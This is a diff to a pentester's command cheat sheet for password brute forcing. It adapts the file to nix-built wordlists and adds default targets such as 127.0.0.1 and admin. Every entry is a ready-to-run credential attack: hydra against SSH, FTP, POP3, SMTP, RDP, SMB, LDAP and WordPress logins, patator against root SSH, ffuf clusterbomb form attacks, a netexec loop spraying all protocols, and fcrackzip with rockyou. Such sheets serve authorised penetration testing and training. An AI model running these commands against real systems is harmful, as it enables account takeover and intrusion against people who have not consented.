@@ -1,64 +1,70 @@
 % Bruteforce Cheats
 
-$ wordlist: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
-$ user-list: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
-$ pass-list: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
-$ list-hydras-functionality: hydra -h | grep 'Supported' | tr ' ' '\n' | tail -n +3
+$ wordlist: find "$(pwd)" "$(nix build --impure --no-link --print-out-paths nixpkgs#seclists)/share/wordlists/seclists" "$(nix build --impure --no-link --print-out-paths nixpkgs#wordlists)/share/wordlists" -type f 2>/dev/null | sort -u
+$ user-list: find "$(pwd)" "$(nix build --impure --no-link --print-out-paths nixpkgs#seclists)/share/wordlists/seclists" "$(nix build --impure --no-link --print-out-paths nixpkgs#wordlists)/share/wordlists" -type f 2>/dev/null | sort -u
+$ pass-list: find "$(pwd)" "$(nix build --impure --no-link --print-out-paths nixpkgs#seclists)/share/wordlists/seclists" "$(nix build --impure --no-link --print-out-paths nixpkgs#wordlists)/share/wordlists" -type f 2>/dev/null | sort -u
+$ list-hydras-functionality: nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c sh -c 'hydra -h | grep "Supported" | tr " " "\n" | tail -n +3'
+$ ip: printf '%s\n' 127.0.0.1
+$ domain: printf '%s\n' WORKGROUP
+$ username: printf '%s\n' admin
+$ url: printf '%s\n' http://127.0.0.1/
+$ request: find "$(pwd)" -type f 2>/dev/null | sort -u
+$ zip-file-location: find "$(pwd)" -type f \( -name '*.zip' -o -name '*.7z' \) 2>/dev/null | sort -u
 
 
 ## ssh section
 # Hydra SSH Against Known username on port 22
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra <ip> -s 22 ssh -l <user-list> -P <pass-list>
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra <ip> -s 22 ssh -l <user-list> -P <pass-list>
 
 # Hydra SSH using list of users and passwords
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -v -V -u -L <user-list> -P <pass-list> -t 1 -u <ip> ssh
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -v -V -u -L <user-list> -P <pass-list> -t 1 -u <ip> ssh
 
 # Hydra SSH using a known password and a username list
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -v -V -u -L <user-list> -p 'known-password' -t 1 -u <ip> ssh 
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -v -V -u -L <user-list> -p 'known-password' -t 1 -u <ip> ssh
 
 # patator ssh brutefoce 22 with username root
-NIXPKGS_ALLOW_UNFREE=1 nix shell github:esp0xdeadbeef/cheat.sheets#patator -c patator ssh_login host=<ip> port=22 user=root password=FILE0 0=<pass-list> --allow-ignore-failures persistent=0 -x ignore:egrep="Authentication failed."
+nix shell github:esp0xdeadbeef/cheat.sheets#patator -c patator ssh_login host=<ip> port=22 user=root password=FILE0 0=<pass-list> --allow-ignore-failures persistent=0 -x ignore:egrep="Authentication failed."
 
 ## hydra bruteforcing
 # Global functionality unlisted functions for Hydra with user pass list
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> <list-hydras-functionality> -V -f
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> <list-hydras-functionality> -V -f
 
 # Hydra FTP known user and password list
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -t 1 -l admin -P <pass-list> -vV <ip> ftp
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -t 1 -l admin -P <pass-list> -vV <ip> ftp
 
 # Hydra POP3 Brute Force
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -l <username> -P <pass-list> -f <ip> pop3 -V 
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -l <username> -P <pass-list> -f <ip> pop3 -V
 
 # Hydra SMTP Brute Force
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -P <pass-list> <ip> smtp -V
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -P <pass-list> <ip> smtp -V
 
 # Hydra attack Windows Remote Desktop with password list
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -t 1 -V -f -l administrator -P <pass-list> rdp://<ip>
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -t 1 -V -f -l administrator -P <pass-list> rdp://<ip>
 
 # Hydra brute force SMB user with password list:
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -t 1 -V -f -l administrator -P <pass-list> <ip> smb
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -t 1 -V -f -l administrator -P <pass-list> <ip> smb
 
 # SMB Brute Forcing
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> smb -V -f
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> smb -V -f
 
 # LDAP Brute Forcing #
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> ldap2 -V -f
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> ldap2 -V -f
 
 # Crack Password Protected zip file
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#fcrackzip -c fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <zip-file-location>
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#fcrackzip -c fcrackzip -u -D -p "$(nix build --impure --no-link --print-out-paths nixpkgs#rockyou)/share/wordlists/rockyou.txt" <zip-file-location>
 
 ## web bruteforcing
 # Hydra attack http get 401 login with a dictionary
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> http-get /admin
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -L <user-list> -P <pass-list> <ip> http-get /admin
 
 # Hydra brute force a Wordpress admin login
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -l admin -P <pass-list> <ip> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#thc-hydra -c hydra -l admin -P <pass-list> <ip> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 
 # post header bruteforce FUFF clusterbomb
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#ffuf -c ffuf -w <user-list>:USERFUZZ -w <pass-list>:PASSWORDFUZZ -u <url> -d "username=USERFUZZ&password=PASSWORDFUZZ" -H "Content-type: application/x-www-form-urlencoded" -mode clusterbomb 
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#ffuf -c ffuf -w <user-list>:USERFUZZ -w <pass-list>:PASSWORDFUZZ -u <url> -d "username=USERFUZZ&password=PASSWORDFUZZ" -H "Content-type: application/x-www-form-urlencoded" -mode clusterbomb
 
 # FUFF clusterbomb with an request from burp (sed -i 's/your-value-what-needs-to-be-fuzzed/DIRECTORYATTACK/g')
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#ffuf -c ffuf -request <request> -w <wordlist>:DIRECTORYATTACK -request-proto http 
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#ffuf -c ffuf -request <request> -w <wordlist>:DIRECTORYATTACK -request-proto http
 
 # netexec let's do every protocol (slow)
-NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#netexec -c sh -c 'for i in $(nxc | grep "{ " | tail -n 1 | cut -d "{" -f 2 | cut -d "}" -f 1 | tr "," "\n"); do nxc $i <ip> -d <domain> -u "<user-list>" -p <pass-list>;done'
+nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#netexec -c sh -c 'for i in $(nxc | grep "{ " | tail -n 1 | cut -d "{" -f 2 | cut -d "}" -f 1 | tr "," "\n"); do nxc $i <ip> -d <domain> -u "<user-list>" -p <pass-list>;done'
